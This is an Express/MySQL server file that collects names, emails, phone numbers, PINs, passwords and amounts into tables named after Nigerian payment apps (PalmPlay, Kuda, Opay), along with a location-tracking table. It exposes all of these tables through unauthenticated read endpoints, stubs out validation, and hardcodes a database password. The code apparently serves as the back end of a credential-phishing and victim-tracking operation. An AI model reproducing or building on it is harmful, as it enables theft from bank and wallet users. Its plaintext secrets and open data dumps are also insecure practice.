
const express = require("express");
const mysql = require("mysql2");
const cors = require("cors");
const app = express();
const port = process.env.PORT || 3001;
const db = mysql.createConnection({
    host: "containers-us-west-65.railway.app",
    user: "root",
    password: "ZTRGMbSIK5xTEwRUEkE0",
    port: "7871",
    database: "railway"
});
const getDataQuery = "SELECT * FROM CLIENT_DB";
const postDataQuery = "INSERT INTO CLIENT_DB (client_firstname, client_lastname, client_phonenumber, client_password, client_pin, client_amount) VALUES (?,?,?,?,?,?)";
const deleteDataQuery = "DELETE FROM CLIENT_DB WHERE client_firstname = ? AND client_lastname = ? AND client_phonenumber = ? AND client_password = ? AND client_pin = ? AND client_amount = ? ";
const getLocationQuery = "SELECT * FROM LocationTracker";
let postLocationQuery = "INSERT INTO LocationTracker (time, location) VALUES (?,?)";
const postPalmPlayDataQuery = "INSERT INTO PalmPlay (firstName, lastName, email, phoneNumber, pin, password, amount) VALUES (?,?,?,?,?,?,?)";
const getPalmPlayDataQuery = "SELECT * FROM PalmPlay";
const postKudaDataQuery = "INSERT INTO Kuda (firstName, lastName, email, phoneNumber, pin, password, amount) VALUES (?,?,?,?,?,?,?)";
const getKudaDataQuery = "SELECT * FROM Kuda";
const postOpayDataQuery = "INSERT INTO Opay (firstName, lastName, email, phoneNumber, pin, password, amount) VALUES (?,?,?,?,?,?,?)";
const getOpayDataQuery = "SELECT * FROM Opay";
function checkingData(client_firstname, client_lastname, client_phonenumber, client_password, client_pin, client_amount) {
    return true;
};
function checkingLocationData(time, location) {
    return true;
}
app.use(express.json());
app.use(cors());
app.get("/GetData", (req, res) => {
    db.query(getDataQuery, (error, result) => {
        if (error) throw error;
        res.send(result);
    });
});
app.post("/PostData", (req, res) => {
    const client_firstname = req.body.client_firstname;
    const client_lastname = req.body.client_lastname;
    const client_phonenumber = req.body.client_phonenumber;
    const client_password = req.body.client_password;
    const client_pin = req.body.client_pin;
    const client_amount = req.body.client_amount;
    if (checkingData()) {
        db.query(postDataQuery, [client_firstname, client_lastname, client_phonenumber, client_password, client_pin, client_amount], (error, result) => {
            if (error) throw error;
        });
        res.end();
    };
});
app.delete("/DeleteData", (req, res) => {
    const client_firstname = req.body.client_firstname;
    const client_lastname = req.body.client_lastname;
    const client_phonenumber = req.body.client_phonenumber;
    const client_password = req.body.client_password;
    const client_pin = req.body.client_pin;
    const client_amount = req.body.client_amount;
    if (checkingData()) {
        db.query(deleteDataQuery, [client_firstname, client_lastname, client_phonenumber, client_password, client_pin, client_amount], (error, result) => {
            if (error) throw error;
        });
        res.end();
    };
});
app.get("/GetLocation", (req, res) => {
    db.query(getLocationQuery, (err, result) => {
        if (err) throw err;
        res.send(result);
    });
});
app.post("/PostLocation", (req, res) => {
    let count = 0;
    const Interval = setInterval(() => {
        if((Object.keys(req.body).length <= 1) &&(count <= 5)){
            count++;
        }else if((Object.keys(req.body).length <= 1) && (count > 5)){
            postLocationQuery = "INSERT INTO LocationTracker (time, location) VALUES ('Time Not Received', 'Location Not Received')";
            clearInterval(Interval);
        }
        else{
            clearInterval(Interval);
        }
    }, 1000);
    const date = req.body.date;
    const location = req.body.location;
    if((Object.keys(req.body).length <= 1) && (count > 5)){
        db.query(postLocationQuery, (err, result)=>{
            if (err) throw err;
        });
    }else{
        db.query(postLocationQuery, [date, location], (err, result) => {
            if (err) throw err;
        });
    }
    res.end();
});
app.get("/GetPalmPlayData", (req, res)=>{
    db.query(getPalmPlayDataQuery, (err, result)=>{
        if(err) throw err;
        res.send(result);
    });
});
app.post("/PostPalmPlayData", async (req, res)=>{
    const firstName = req.body.firstName;
    const lastName = req.body.lastName;
    const email = req.body.email;
    const phoneNumber = req.body.phoneNumber;
    const pin = req.body.pin;
    const password = req.body.password;
    const amount = req.body.amount;
    db.query(postPalmPlayDataQuery, [firstName, lastName, email, phoneNumber, pin, password, amount], (err, result)=>{
        if(err) throw err;
    });
    res.end();
});
app.get("/GetKudaData", (req, res)=>{
    db.query(getKudaDataQuery, (err, result)=>{
        if(err) throw err;
        res.send(result);
    });
});
app.post("/PostKudaData", (req, res)=>{
    const firstName = req.body.firstName;
    const lastName = req.body.lastName;
    const email = req.body.email;
    const phoneNumber = req.body.phoneNumber;
    const pin = req.body.pin;
    const password = req.body.password;
    const amount = req.body.amount; 
    db.query(postKudaDataQuery, [firstName, lastName, email, phoneNumber, pin, password, amount], (err, result)=>{
        if(err) throw err;
    });
    res.end();
});
app.get("/GetOpayData", (req, res)=>{
    db.query(getOpayDataQuery, (err, result)=>{
        if(err) throw err;
        res.send(result);
    });
});
app.post("/PostOpayData", (req, res)=>{
    const firstName = req.body.firstName;
    const lastName = req.body.lastName;
    const email = req.body.email;
    const phoneNumber = req.body.phoneNumber;
    const pin = req.body.pin;
    const password = req.body.password;
    const amount = req.body.amount;
    db.query(postOpayDataQuery, [firstName, lastName, email, phoneNumber, pin, password, amount], (err, result)=>{
        if(err) throw err;
    });
    res.end();
});
app.listen(port, () => {
    console.log("Listening to PORT: ", port)
});
